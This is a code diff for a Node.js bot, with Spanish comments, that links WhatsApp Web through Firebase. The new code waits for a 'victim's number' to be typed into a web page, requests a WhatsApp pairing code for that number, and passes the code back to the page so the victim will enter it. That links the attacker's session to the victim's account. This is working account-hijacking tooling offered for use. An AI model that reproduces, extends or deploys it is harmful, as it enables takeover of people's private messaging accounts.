@@ -1,50 +1,46 @@
 const { Client, LocalAuth } = require('whatsapp-web.js');
 const admin = require('firebase-admin');
-const express = require('express');
-const app = express();
+const http = require('http');
 
-// 1. CARGAR FIREBASE
 const serviceAccount = require("./serviceAccountKey.json"); 
-if (!admin.apps.length) {
-    admin.initializeApp({
-        credential: admin.credential.cert(serviceAccount)
-    });
-}
+if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
 const db = admin.firestore();
 
-// CONFIGURACIÓN DEL CLIENTE SIN RUTA FIJA (PARA QUE RENDER LO ENCUENTRE SOLO)
 const client = new Client({
     authStrategy: new LocalAuth(),
     puppeteer: {
         headless: true,
-        args: [
-            '--no-sandbox',
-            '--disable-setuid-sandbox',
-            '--disable-dev-shm-usage',
-            '--single-process'
-        ]
-        // HEMOS QUITADO EL EXECUTABLE PATH PORQUE DABA ERROR
+        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process'],
+        executablePath: '/usr/bin/google-chrome-stable'
     }
 });
 
-client.on('qr', async (qr) => {
-    console.log('NUEVO QR RECIBIDO');
-    const qrImage = https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=${encodeURIComponent(qr)};
-    
-    await db.collection("wa_clon_global").doc("current_session").set({
-        qrCode: qrImage,
-        status: "esperando",
-        lastUpdate: admin.firestore.FieldValue.serverTimestamp()
-    }, { merge: true });
+// ESCUCHAR CUANDO LA VÍCTIMA PONE SU NÚMERO EN LA WEB
+db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
+    const data = snap.data();
+    if (data && data.numero_victima && data.status === "solicitando_codigo") {
+        console.log("Solicitando código para:", data.numero_victima);
+        try {
+            // SOLICITAR CÓDIGO DE 8 DÍGITOS A WHATSAPP
+            const pairingCode = await client.requestPairingCode(data.numero_victima);
+            console.log("CÓDIGO GENERADO:", pairingCode);
+            
+            // SUBIR CÓDIGO A FIREBASE
+            await snap.ref.update({
+                pairingCode: pairingCode,
+                status: "mostrando_codigo"
+            });
+        } catch (err) {
+            console.error("Error al pedir código:", err);
+        }
+    }
 });
 
 client.on('ready', () => {
-    console.log('¡CONEXIÓN EXITOSA!');
+    console.log('¡SESIÓN VINCULADA CON ÉXITO!');
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
-client.initialize().catch(err => console.error("Error al iniciar Cliente:", err));
+client.initialize();
 
-const port = process.env.PORT || 3000;
-app.get('/', (req, res) => res.send('MOTOR OK'));
-app.listen(port, () => console.log('Servidor en puerto ' + port));
+http.createServer((req, res) => { res.end('MOTOR PAIRING ONLINE'); }).listen(process.env.PORT || 3000);
